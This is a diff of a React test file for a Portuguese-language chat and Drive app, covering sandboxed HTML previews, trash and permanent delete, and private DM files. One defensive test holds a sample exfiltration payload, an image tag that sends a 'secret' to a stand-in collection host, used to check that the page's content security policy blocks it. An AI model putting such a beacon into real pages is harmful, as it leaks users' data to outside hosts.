@@ -12,10 +12,18 @@ import {
   sortRows,
   toCsv,
 } from "@agenteschat/client/lib/artifacts";
-import { daysLeft, groupArtifacts, rangeOf, sortArtifacts } from "@agenteschat/client/lib/drive";
+import {
+  artifactPlace,
+  daysLeft,
+  driveSections,
+  groupArtifacts,
+  rangeOf,
+  sortArtifacts,
+} from "@agenteschat/client/lib/drive";
+import { PAGE_CSP } from "@agenteschat/client/lib/isolated-page";
 import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
 import { fileSaver } from "@/components/artifacts/ArtifactViewer";
-import { HTML_SANDBOX, withShim } from "@/components/artifacts/HtmlFrame";
+import { HTML_SANDBOX, HtmlFrame, withShim } from "@/components/artifacts/HtmlFrame";
 import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
 import { Markdown, parseMarkdown } from "@/lib/markdown";
 import { ATLAS_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
@@ -142,10 +150,37 @@ describe("artifact cards in the chat", () => {
     await settle(3);
     expect(within(html).getByRole("img", { name: "Página interativa. Abra para ver." })).toBeTruthy();
     const thumb = html.querySelector("iframe") as HTMLIFrameElement;
-    expect(thumb.getAttribute("sandbox")).toBe("allow-scripts");
+    expect(thumb.getAttribute("sandbox")).toBe("allow-scripts allow-forms");
     expect(thumb.getAttribute("scrolling")).toBe("no");
     expect(thumb.getAttribute("tabindex")).toBe("-1");
     expect(thumb.getAttribute("aria-hidden")).toBe("true");
+  });
+});
+
+describe("a file card's right click (desktop app)", () => {
+  test("who may delete it gets Mover para a lixeira, which asks first and sends it to the trash", async () => {
+    const w = window as { __agentesDesktop?: unknown; __TAURI_INTERNALS__?: unknown };
+    w.__agentesDesktop = { version: "0.6.0" };
+    w.__TAURI_INTERNALS__ = { invoke: async (cmd: string) => (cmd === "this_mac" ? { orgs: [] } : {}) };
+    try {
+      const { api, a } = await openChannel();
+      await act(async () =>
+        fireEvent.contextMenu(card("Relatório de incidente: checkout"), { clientX: 40, clientY: 60 }),
+      );
+      await settle(2);
+      const menu = screen().getByRole("menu");
+      await click(within(menu).getByRole("menuitem", { name: "Mover para a lixeira" }));
+      await settle(2);
+      const confirm = screen().getByRole("dialog", {
+        name: "Mover “Relatório de incidente: checkout” para a lixeira?",
+      });
+      await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
+      await settle(4);
+      expect((await api.artifacts.trash(ORG_ID)).map((x) => x.id)).toContain(a.document.id);
+    } finally {
+      delete w.__agentesDesktop;
+      delete w.__TAURI_INTERNALS__;
+    }
   });
 });
 
@@ -232,14 +267,14 @@ describe("artifact viewer", () => {
     expect(img?.getAttribute("src")?.startsWith("data:image/svg+xml")).toBe(true);
   });
 
-  test("html: only in a sandboxed iframe with allow-scripts and never allow-same-origin", async () => {
+  test("html: only in a sandboxed iframe, with scripts and forms and never allow-same-origin", async () => {
     await openChannel();
     const dialog = await openCard("Painel de erros da semana");
     await settle(3);
     const frame = dialog.querySelector("iframe") as HTMLIFrameElement;
     expect(frame).not.toBeNull();
-    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
-    expect(HTML_SANDBOX).toBe("allow-scripts");
+    expect(frame.getAttribute("sandbox")).toBe("allow-scripts allow-forms");
+    expect(HTML_SANDBOX).toBe("allow-scripts allow-forms");
     expect(frame.getAttribute("sandbox")).not.toContain("allow-same-origin");
     expect(frame.hasAttribute("srcdoc")).toBe(false);
     expect(frame.getAttribute("src")).toMatch(/^(blob:|data:text\/html)/);
@@ -564,6 +599,69 @@ describe("Drive", () => {
     expect(screen().getByRole("dialog", { name: "Organograma do time" })).toBeTruthy();
   });
 
+  test("the details' … matches Copiar link; who can see it, in plain words", async () => {
+    await goDrive();
+    await click(card("Organograma do time"));
+    await settle(4);
+    const panel = screen().getByRole("dialog", { name: "Organograma do time" });
+    const more = within(panel).getByRole("button", { name: "Mais ações: Organograma do time" });
+    expect(more.className).toBe(within(panel).getByRole("button", { name: "Copiar link" }).className);
+    expect(panel.querySelector(".drive-audience")?.textContent).toBe(
+      "Todo o workspace pode ver: está no canal público #eng",
+    );
+  });
+
+  /** A file Atlas left in its DM with me, and one in the Drive only. */
+  const withDmFile = async () => {
+    const state = seedState();
+    state.dms.push({
+      channelId: "dm-atlas",
+      with: { type: "agent", id: ATLAS_ID, name: "Atlas", handle: "atlas" },
+    });
+    const api = createFakeApi(state);
+    await api.artifacts.create(ORG_ID, {
+      title: "Rascunho da proposta",
+      channelId: "dm-atlas",
+      content: { kind: "document", markdown: "# Proposta" },
+    });
+    await api.artifacts.create(ORG_ID, {
+      title: "Manual do time",
+      content: { kind: "document", markdown: "# Manual" },
+    });
+    return goDrive({ api });
+  };
+
+  test("a DM's file: in Privado, says only the two of us see it, and opens that DM (never a channel)", async () => {
+    const { router } = await withDmFile();
+    // Its own section, last, apart from what the team sees.
+    const heads = Array.from(document.querySelectorAll(".drive-group__title")).map((h) => h.textContent);
+    expect(heads.at(-1)).toBe("Privado");
+    const privateSection = document.querySelectorAll(".drive-group")[heads.length - 1] as HTMLElement;
+    expect(within(privateSection).getByRole("button", { name: "Rascunho da proposta" })).toBeTruthy();
+    expect(within(privateSection).queryByRole("button", { name: "Manual do time" })).toBeNull();
+
+    await click(card("Rascunho da proposta"));
+    await settle(4);
+    const panel = screen().getByRole("dialog", { name: "Rascunho da proposta" });
+    expect(panel.querySelector(".drive-audience")?.textContent).toBe(
+      "Só você e Atlas podem ver: veio de uma mensagem direta",
+    );
+    expect(panel.textContent).toContain("Mensagem direta com Atlas");
+    await pick(panel, /^Mais ações: /, "Abrir a conversa");
+    await settle(4);
+    expect(router.state.location.pathname).toBe(`/org/${ORG_ID}/dm/agent/${ATLAS_ID}`);
+  });
+
+  test("a Drive-only file is seen by the whole workspace and has no conversation to open", async () => {
+    await withDmFile();
+    await click(card("Manual do time"));
+    await settle(4);
+    const panel = screen().getByRole("dialog", { name: "Manual do time" });
+    expect(panel.querySelector(".drive-audience")?.textContent).toBe("Todo o workspace pode ver");
+    expect(panel.textContent).toContain("Só no Drive");
+    expect(panel.querySelector("button.drive-where")).toBeNull();
+  });
+
   test("details list the versions; Ver opens an older one", async () => {
     await goDrive();
     await click(card("Relatório de incidente: checkout"));
@@ -603,8 +701,8 @@ describe("Drive", () => {
     expect(saved.map((s) => s.name).sort()).toEqual(["organograma-do-time.mmd", "pedidos-mais-comuns-nos-reviews.csv"]);
 
     await click(within(bar()).getByRole("button", { name: "Mover para a lixeira" }));
-    const confirm = screen().getByRole("dialog", { name: "Apagar 2 arquivos?" });
-    await click(within(confirm).getByRole("button", { name: "Apagar" }));
+    const confirm = screen().getByRole("dialog", { name: "Mover 2 arquivos para a lixeira?" });
+    await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
     await settle(5);
     expect(state.calls.filter((c) => c.method === "artifacts.remove")).toHaveLength(2);
     expect(names()).toHaveLength(3);
@@ -653,6 +751,7 @@ describe("artifact helpers", () => {
         updatedAt: iso,
         channelId: null,
         createdBy: { type: "agent", id: "a" },
+        audience: { kind: "workspace" },
       }) as Artifact;
     const list = [
       at("1", "b", "2026-10-16T09:00:00"),
@@ -671,6 +770,42 @@ describe("artifact helpers", () => {
     expect(rangeOf(["1", "2"], null, "2")).toEqual(["2"]);
     expect(daysLeft("2026-10-19T12:00:00", now)).toBe(3);
     expect(daysLeft("2026-10-01T12:00:00", now)).toBe(0);
+  });
+
+  test("private files get a section of their own; each file opens where it came from", () => {
+    const now = new Date("2026-10-16T12:00:00");
+    const file = (id: string, audience: Artifact["audience"], channelId: string | null = "c", threadId = null) =>
+      ({
+        id,
+        title: id,
+        kind: "document",
+        updatedAt: "2026-10-16T09:00:00",
+        channelId,
+        threadId,
+        createdBy: { type: "agent", id: "a" },
+        audience,
+      }) as unknown as Artifact;
+    const dm = file("dm", { kind: "dm", with: { type: "person", id: "u2" } });
+    const locked = file("locked", { kind: "channel", name: "x", private: true });
+    const open = file("open", { kind: "channel", name: "eng", private: false });
+    const drive = file("drive", { kind: "workspace" }, null);
+    expect(driveSections([dm, open, locked, drive], "date", now).map((s) => [s.key, s.items.map((a) => a.id)])).toEqual(
+      [
+        ["today", ["open", "drive"]],
+        ["private", ["dm", "locked"]],
+      ],
+    );
+    expect(driveSections([open], "none", now).map((s) => s.key)).toEqual([""]);
+    expect(artifactPlace(dm)).toEqual({ to: "/org/$orgId/dm/person/$userId", params: { userId: "u2" } });
+    expect(artifactPlace(open)).toEqual({ to: "/org/$orgId/c/$channelId", params: { channelId: "c" } });
+    expect(artifactPlace({ ...dm, threadId: "root" })).toEqual({
+      to: "/org/$orgId/threads/$threadId",
+      params: { threadId: "root" },
+    });
+    expect(artifactPlace(drive)).toBeNull();
+    expect(artifactPlace(file("gone", { kind: "dm", with: null }))).toBeNull();
+    // An archived agent's or a departed person's DM can't be opened: no button, never an error page.
+    expect(artifactPlace(file("archived", { kind: "dm", with: { type: "agent", id: "a" }, gone: true }))).toBeNull();
   });
 
   test("document preview skips marks and code", () => {
@@ -704,7 +839,7 @@ describe("deleting a file", () => {
     await settle(8);
     return { ...r, api, state };
   };
-  test("the viewer header: one-line title with a tooltip, Baixar ▾, Editar, … with Apagar arquivo", async () => {
+  test("the viewer header: one-line title with a tooltip, Baixar ▾, Editar, … with Mover para a lixeira", async () => {
     await openChannel();
     const dialog = await openCard("Relatório de incidente: checkout");
     const title = dialog.querySelector(".artifact-sheet__title") as HTMLElement;
@@ -713,21 +848,21 @@ describe("deleting a file", () => {
     expect(within(dialog).queryByRole("button", { name: "Baixar PDF" })).toBeNull();
   });
 
-  test("Apagar asks, naming the file; then 'Arquivo apagado · Desfazer' restores it", async () => {
+  test("Mover para a lixeira asks, naming the file; then 'Movido para a lixeira · Desfazer' restores it", async () => {
     const { state } = await goDrive();
     // From the details panel's "…".
     await click(screen().getByRole("button", { name: "Organograma do time" }));
     await settle(4);
     const panel = screen().getByRole("dialog", { name: "Organograma do time" });
-    await pick(panel, /^Mais ações: /, "Apagar arquivo");
-    const confirm = screen().getByRole("dialog", { name: "Apagar “Organograma do time”?" });
+    await pick(panel, /^Mais ações: /, "Mover para a lixeira");
+    const confirm = screen().getByRole("dialog", { name: "Mover “Organograma do time” para a lixeira?" });
     expect(confirm.textContent).toContain("lixeira por 30 dias");
-    await click(within(confirm).getByRole("button", { name: "Apagar" }));
+    await click(within(confirm).getByRole("button", { name: "Mover para a lixeira" }));
     await settle(5);
     expect(state.calls.some((c) => c.method === "artifacts.remove")).toBe(true);
     expect(screen().queryByRole("button", { name: "Organograma do time" })).toBeNull();
     expect(document.querySelector(".drive-details")).toBeNull();
-    expect(screen().getByText("Arquivo apagado")).toBeTruthy();
+    expect(screen().getByText("Movido para a lixeira")).toBeTruthy();
     await click(screen().getByRole("button", { name: "Desfazer" }));
     await settle(5);
     expect(state.calls.some((c) => c.method === "artifacts.restore")).toBe(true);
@@ -748,6 +883,21 @@ describe("deleting a file", () => {
     expect(screen().getByText("A lixeira está vazia.")).toBeTruthy();
   });
 
+  test("Apagar para sempre, after a confirmation, takes it out of the trash", async () => {
+    const { api, state } = await goDrive();
+    const chart = (await api.artifacts.list(ORG_ID)).find((a) => a.title === "Organograma do time") as Artifact;
+    await act(async () => api.artifacts.remove(ORG_ID, chart.id));
+    await click(screen().getByRole("button", { name: "Lixeira" }));
+    await settle(4);
+    expect(screen().getByText(/não contam no armazenamento/)).toBeTruthy();
+    await click(screen().getByRole("button", { name: "Apagar para sempre: Organograma do time" }));
+    const confirm = screen().getByRole("dialog", { name: "Apagar “Organograma do time” para sempre?" });
+    await click(within(confirm).getByRole("button", { name: "Apagar para sempre" }));
+    await settle(5);
+    expect(state.calls.filter((c) => c.method === "artifacts.purge")).toHaveLength(1);
+    expect(screen().getByText("A lixeira está vazia.")).toBeTruthy();
+  });
+
   test("a chat card for a deleted file is a quiet 'Arquivo removido'", async () => {
     const { ArtifactCard } = await import("@/components/artifacts/ArtifactCard");
     expect(ArtifactCard).toBeTruthy();
@@ -759,13 +909,41 @@ describe("deleting a file", () => {
 });
 
 describe("html shim", () => {
-  test("goes after <head>, else after the doctype, else first", () => {
-    const head = withShim("<!doctype html><html><head><title>x</title></head><body></body></html>");
-    expect(head.startsWith("<!doctype html><html><head><script>")).toBe(true);
-    expect(head.indexOf("<script>")).toBeLessThan(head.indexOf("<title>"));
-    const doctype = withShim("<!DOCTYPE html>\n<body><h1>a</h1></body>");
-    expect(doctype.startsWith("<!DOCTYPE html><script>")).toBe(true);
-    expect(withShim("<h1>a</h1>").startsWith("<script>")).toBe(true);
-    expect(withShim("<header>a</header>").startsWith("<script>")).toBe(true);
+  test("runs before the page, behind the policy", () => {
+    const page = withShim("<!doctype html><html><head><title>x</title></head><body></body></html>");
+    expect(page.startsWith("<!doctype html><html><head>")).toBe(true);
+    expect(page.indexOf("Content-Security-Policy")).toBeLessThan(page.indexOf("<script>"));
+    expect(page.indexOf("<script>")).toBeLessThan(page.indexOf("<title>"));
+    expect(withShim("<h1>a</h1>").indexOf("<script>")).toBeLessThan(withShim("<h1>a</h1>").indexOf("<h1>"));
+  });
+
+  test("a chat card's preview loads nothing from the network, its policy before anything of the page", () => {
+    const hostile = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head><title>x</title></head></html>`;
+    const preview = withShim(hostile);
+    const policy = `<meta http-equiv="Content-Security-Policy" content="${PAGE_CSP}">`;
+    expect(preview.indexOf(policy)).toBeGreaterThan(-1);
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<img"));
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<script>"));
+    expect(PAGE_CSP).toContain("default-src 'none'");
+    expect(PAGE_CSP).not.toContain("http");
+  });
+
+  test("the card's frame loads the page behind the policy", async () => {
+    const pages: Blob[] = [];
+    const create = URL.createObjectURL;
+    URL.createObjectURL = (b: Blob | MediaSource) => {
+      pages.push(b as Blob);
+      return `blob:page-${pages.length}`;
+    };
+    try {
+      const html = "<!doctype html><html><head></head><body>x</body></html>";
+      render(<HtmlFrame html={html} title="card" thumbnail />);
+      await settle(1);
+      const card = await pages[0]?.text();
+      expect(card?.indexOf(PAGE_CSP)).toBeGreaterThan(-1);
+      expect(card?.indexOf(PAGE_CSP)).toBeLessThan(card?.indexOf("<body>") ?? -1);
+    } finally {
+      URL.createObjectURL = create;
+    }
   });
 });
